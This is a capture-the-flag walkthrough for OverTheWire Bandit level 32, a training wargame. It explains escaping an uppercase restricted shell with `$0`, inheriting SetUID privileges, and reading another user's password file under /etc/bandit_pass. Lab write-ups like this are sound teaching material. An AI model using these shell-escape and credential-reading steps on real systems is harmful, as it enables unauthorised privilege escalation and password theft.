# Bandit Level 32 → Level 33

> The challenge starts in a custom uppercase shell that converts user input to uppercase, preventing normal shell commands from working. The goal is to escape this restricted shell and obtain an interactive shell with the privileges of `bandit33`.

## Steps

1. **Escape the uppercase shell:**
   ```bash
   $0
   ```
   `$0` expands to the name of the current shell. Executing it starts a new shell (`sh`), escaping the uppercase input restriction.
2. **Inspect the environment:**
   ```bash
   pwd
   ls
   file uppershell
   ls -lh .
   ```
   The `uppershell` executable is a SetUID binary owned by `bandit33`:
   ```text
   -rwsr-x--- 1 bandit33 bandit32 ... uppershell
   ```
3. **Verify the current privileges:**
   ```bash
   whoami
   ```
   Output:
   ```text
   bandit33
   ```
   The new shell retains the effective privileges of `bandit33`, inherited from the SetUID executable.
4. **Retrieve the next password:**
   ```bash
   cat /etc/bandit_pass/bandit33
   ```
   The command displays the password for Level 33.
